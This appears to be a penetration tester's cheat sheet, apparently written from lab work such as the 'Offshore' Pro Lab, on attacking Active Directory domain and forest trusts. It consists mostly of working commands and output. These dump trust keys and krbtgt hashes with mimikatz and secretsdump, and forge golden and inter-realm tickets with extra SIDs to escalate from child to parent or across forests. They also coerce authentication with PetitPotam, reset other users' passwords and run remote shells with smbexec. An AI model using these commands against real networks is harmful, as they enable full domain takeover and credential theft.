# Trusts

## Enumeration

{% code overflow="wrap" fullWidth="true" %}
```bash
# ldeep supports cleartext, pass-the-hash, pass-the-ticket, etc.
ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" trusts
# Bloodhound (button map domain trusts)
MATCH p=(n:Domain)-->(m:Domain) RETURN p

. .\PowerView.ps1
Get-DomainTrust

# Bidirectional trust means we can log in on the target domain using creds from the trusted domain
nxc smb target.dom.com_DC-IP trusted.dom.com\<trusted.dom.com'user'> password?? target.dom.com/user@TARGET_IP
smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:XXX target.dom.com/user@TARGET_IP

# If we see at some point QUARANTINED_DOMAIN -> there is some sort of SID filtering in place.

# ldeep supports cleartext, pass-the-hash, pass-the-ticket, etc.
ldeep ldap -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -s ldap://"$DC_IP" trusts

# ldapdomaindump will store HTML, JSON and Greppable output
ldapdomaindump --user 'DOMAIN\USER' --password "$PASSWORD" --outdir "ldapdomaindump" "$DC_HOST"

# ldapsearch-ad
ldapsearch-ad --server "$DC_HOST" --domain "$DOMAIN" --username "$USER" --password "$PASSWORD" --type trusts

# ldapsearch
ldapsearch -h ldap://"$DC_IP" -b "CN=SYSTEM,DC=$DOMAIN" "(objectclass=trustedDomain)"
```
{% endcode %}

## Bidirectional trust

When trust is Bidirectional, you can use whatever account you have on one Domain to access LDAP information on the other

{% code overflow="wrap" fullWidth="true" %}
```bash
# When querying another domain
SharpHound.exe -d dev.admin.offshore.com -c all
...
2025-06-14T18:55:55.3206424-04:00|ERROR|Unable to connect to LDAP, verify your credentials
# Use LDAP credentials
.\Sharphound.exe -c All -d dev.ADMIN.OFFSHORE.com --ldapusername ned.flanders_adm --ldappassword [password]
```
{% endcode %}

## Forging Tickets

### Referral Ticket

{% code overflow="wrap" fullWidth="true" %}
```bash
# We need inter-realm key
mimikatz #
privilege::debug
mimikatz # Privilege '20' OK

lsadump::trust /patch

# GRAB THE AES256 HASH OF THE FIRST ONE (USUALLY IT IS THE FIRST), WHAT WE WANT IS OWNED DOMAIN -> TARGET DOMAIN WITH BOTH SIDS WRITTEN

# Then forge the ticket
mimikatz kerberos::golden /user:Administrator /domain:trusted.dom.com /sid:compromised_domain_SID /sids:<target_domain_SID>-<RID> /aes256:XXX /service:krbtgt /target:target.dom.com /ticket:golden.kirbi

# Inject it to make it work
Rubeus.exe asktgs /ticket:C:\Users\Administrator\Documents\golden.kirbi /service:cifs/dc.target.dom.com /dc:dc.target.dom.com /ptt /nowrap

# Now we can confirm we can access DC shares
dir \\dc.target.dom.com\C$


############## ALTERNATIVE
##### 1. forge the referral ticket
ticketer.py -nthash "inter-realm key" -domain-sid "compromised_domain_SID" -domain "compromised_domain_FQDN" -extra-sid "<target_domain_SID>-<RID>" -spn "krbtgt/target_domain_fqdn" "someusername"

└─$ ticketer.py -nthash "2318b918471201f832d6a6141e747fd1" -domain-sid "S-1-5-21-..." -domain "compromised_domain_FQDN" -extra-sid "S-1-5-21-...-519" -spn "krbtgt/target.dom.com" "administrator"
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for compromised_domain_FQDN/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
                                                                                                                                                                             

##### 2. use it to request a service ticket
KRB5CCNAME="someusername.ccache" getST.py -k -no-pass -debug -spn "CIFS/domain_controller" "target_domain_fqdn/someusername@target_domain_fqdn"

┌──(kali㉿kali)-[~/…/Pro-Labs/Offshore/172.16.2.6/files]
└─$ export KRB5CCNAME=administrator.ccache
                                                                                                                                                                             
# REQUEST A SERVICE TICKET FOR THE TARGET DC
└─$ getST.py -k -no-pass -debug -spn "CIFS/dc03.target.dom.com" "target.dom.com"/"administrator"@"target.dom.com" -dc-ip $DC_IP
[+] Impacket Library Installation Path: /home/kali/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket
[+] Using Kerberos Cache: administrator.ccache
[+] Returning cached credential for KRBTGT/XXX
[+] Using TGT from cache
[+] Username retrieved from CCache: administrator
[*] Getting ST for user
[+] Trying to connect to KDC at 172.16.X.X:88
[*] Saving ticket in administrator@XXX.ccache

# Now we can dump hashes from the DC
└─$ secretsdump.py dc03.target.dom.com -k -no-pass 
```
{% endcode %}

### SID Filtering / SID History / Find old SID traces

[https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/](https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/)

[https://github.com/TheManticoreProject/FindOldSIDTraces](https://github.com/TheManticoreProject/FindOldSIDTraces)

## Child to parent

{% code overflow="wrap" fullWidth="true" %}
```bash
#Impacket's raiseChild.py script can also be used to conduct the golden ticket technique automatically when SID filtering is disabled (retrieving the SIDs, dumping the trusted domain's krbtgt, forging the ticket, dumping the forest root keys, etc.). It will forge a ticket with the Enterprise Admins extra SID. 
raiseChild.py "child_domain"/"child_domain_admin":"$PASSWORD"

# That was the easiest option with one command, now another one Golden ticket + ExtraSid
https://adsecurity.org/?p=1640
# First dump the krbtgt of the domain we own (dump child ntds and get krbtgt NT hash)
secretsdump.py -just-dc-user domain/krbtgt child.domain.local/user:pass@$CHILD_DC_IP
# Dump child domain SID (Bloodhound also shows this info for child and parent)
lookupsid.py  -domain-sids child.domain.local/user:pass@$CHILD_DC_IP 0
# dump parent domain SID 
lookupsid.py  -domain-sids child.domain.local/user:pass@$PARENT_DC_IP 0
# now create the golden ticket : we add “-519” at the end of the extra-sid (means enterprise admin)
ticketer.py -nthash $krbtgt_NThash \
 -domain-sid $CHILD_DOMAIN_SID \
 -domain child.domain.local \
 -extra-sid $PARENT_DOMAIN_SID-519 \
 goldenuser
# And we use the ticket to dump the parent domain NTDS
export KRB5CCNAME=goldenuser.ccache 
secretsdump.py -k -no-pass -just-dc-ntlm child.domain.local.local/goldenuser@parent.domain.local

# Trust ticket - forge inter-realm TGT
https://adsecurity.org/?p=1588
# Another way to escalate from child to parent is by extracting the trust key and use it to create our trust ticket
# The trust key can be found by targeting the netbios name of the domain on the ntds
secretsdump -just-dc-user 'DOMAIN_NETBIOS_NAME$' child.domain.local/user:pass@$CHILD_DC_IP
# Forge the ticket but this time we will set the spn : krbtgt/parent_domain
ticketer.py -nthash $krbtgt_NThash \
 -domain-sid $CHILD_DOMAIN_SID \
 -domain child.domain.local \
 -extra-sid $PARENT_DOMAIN_SID-519 \
 -spn krbtgt/domain.local trustfakeuser
# use the forged TGT to ask a ST on the parent domain
export KRB5CCNAME=trustfakeuser.ccache   
getST.py -k -no-pass -spn cifs/parent.domain.local domain.local/trustfakeuser@domain.local -debug
# now we can use our service ticket to connect via SMB or dump secrets
export KRB5CCNAME=trustfakeuser@domain.local@cifs....ccache
smbclient.py -k -no-pass trustfakeuser@parent.domain.local

# Unconstrained delegation
```
{% endcode %}

## Forest Trust (Forest to Forest)

## Password reuse

On a real environment this is really accurate. Dump the ntds of the domain you own and try to find the same users on the external forest domains.

## Foreign group and users

{% code overflow="wrap" fullWidth="true" %}
```bash
# See the link between the domains (CAREFUL, THIS QUERY IS A LITTLE BIT TOO HEAVY FOR REAL-WORLD AD)
MATCH p = (a:Domain)-[:Contains*1..]->(x)-->(w)-->(z)<--(y)<-[:Contains*1..]-(b:Domain) where (x:Container or x:OU) and (y:Container or y:OU) and (a.name <>b.name) and (tolower(w.samaccountname) <> "enterprise admins" and tolower(w.samaccountname) <> "enterprise key admins" and tolower(z.samaccountname) <> "enterprise admins" and tolower(z.samaccountname) <> "enterprise key admins")  RETURN p
# Note that bloodhound also have buttons to research foreign groups and users directly in the interface.

# If a group of a forest has MemberOf another group from another forest that has GenericAll over a user, that means any member of the first group can change password of that user
net rpc password $FOREST2_TARGET_USER -U forest1.local/user1%pass1 -S forest2.domain.local
Enter new password  ...: <here we enter P@ssword123>
# And verify
cme smb $FOREST2_DC_IP -u $USER2 -p 'P@ssword123' -d domain2.local
# We can also to that with shadow credentials (but the auto will not work here, we will have to do that with two steps)
certipy shadow add -u forest1user@domain1.local -p 'PASS' -dc-ip $DC_FOREST2_IP -target forest2.domain.local -account 'FOREST2_USER'
certipy auth -pfx forest2user.pfx -username forest2user -domain forest2.local -dc-ip $DC_FOREST2_IP
```
{% endcode %}

## Unconstrained Delegation

{% code overflow="wrap" fullWidth="true" %}
```bash
# Connect to forest1 as administrator and launch Rubeus to wait for a TGT of the other forest (following steps work due to Defender disabled, if not some bypass would be needed)
.\Rubeus.exe monitor /filteruser:COMPUTER2$ /interval:1
# run petitpotam to force a coerce of COMPUTER2 to forest1
petitpotam.py -u user1 -p pass1 -d dc.domain1.local forest1.domain.local forest2.domain.local
# Decode thet ticket and save it to a kirbi file
base64 -d rubeus.b64 > ticket.kirbi
# Convert it to ccache and use it to dcsync forest2
ticketConverter.py ticket.kirbi ticket.ccache 
export KRB5CCNAME=ticket.ccache
secretsdump -k -no-pass -just-dc-ntlm domain2.local/'COMPUTER2$'@forest2.domain.local
```
{% endcode %}

## Mssql Trusted link

The MSSQL trust link is across forest, so it can be used to make forest to forest exploitation.

## Golden ticket with external forest, sid history ftw (forest1 -> forest2)

{% code overflow="wrap" fullWidth="true" %}
```bash
# This attack can be done only because SID history is enabled on the forest2->forest1 trust
# Find both domain sid with lookupsid.py
# extract the krbtgt hash of forest1
secretsdump -just-dc-user 'domain1/krbtgt' domain1.local/user1:pass1@$IP1
# We need a group to target on the extra-sid with an RID > 1000 due to SID filter  (on a real audit exchange groups are usualy a good target)
#     Create the golden ticket for a fake user
ticketer.py -nthash $krbtgt_NThash_forest1 \
 -domain-sid $FOREST1_DOMAIN_SID \
 -domain forest1.domain.local \
 -extra-sid $FOREST2_DOMAIN_SID-$WITH_NUMBER>1000 \
fakeuser
# And use it (secretsdump will work too)
export KRB5CCNAME=goldenticket.ccache
smbexec.py -k -no-pass fakeuser@forest2.domain.local -debug
```
{% endcode %}

## Trust ticket with external forest ( forest1 -> forest2)

{% code overflow="wrap" fullWidth="true" %}
```bash
# just like with the golden ticket we need the sid history enabled to exploit
# Find the domain sid of both forests with lookupsid.py
secretsdump -just-dc-user 'COMPUTER2$' domain1.local/user1:pass@$FOREST2_IP
#     Create the inter-realm tgt ticket
ticketer.py -nthash $krbtgt_NThash_forest1 \
 -domain-sid $FOREST1_DOMAIN_SID \
 -domain forest1.domain.local \
 -extra-sid $FOREST2_DOMAIN_SID-$WITH_NUMBER>1000 \
 -spn krbtgt/domain2.local trustticket
# Ask a service ticket for kingslanding cifs
export KRB5CCNAME=trustticket.ccache
getST.py -k -no-pass -spn cifs/forest2.domain2.local domain2.local/trustticket@domain2.local -debug
#     And enjoy (secretsdump will work too)
export KRB5CCNAME=trustticket....ccache
smbexec.py -k -no-pass trustdragon@kingslanding.sevenkingdoms.local -debug
```
{% endcode %}

## Exploit acl with external trust golden ticket

{% code overflow="wrap" fullWidth="true" %}
```bash
# Exploit ACL of forest2 from forest1 (GenericAll of a group over a user) -> create the golden ticket with mimikatz matching the group with RID > 1000
mimikatz # kerberos::golden /user:guard /domain:domain1.local /sid:$FOREST1_SID /krbtgt:$KRBTGT_HASH_FOREST_1 /sids:FOREST_2_GROUP_SID>1000 /ptt
mimikatz # klist
# powerview to change that user's password
Import-Module .\powerview.ps1
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity $USER -AccountPassword $SecPassword -Domain domain2.local
```
{% endcode %}

## Resources

https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d

https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1

https://adsecurity.org/?p=1640

https://adsecurity.org/?p=1588

https://github.com/fortra/impacket/blob/master/examples/raiseChild.py

https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/

https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/
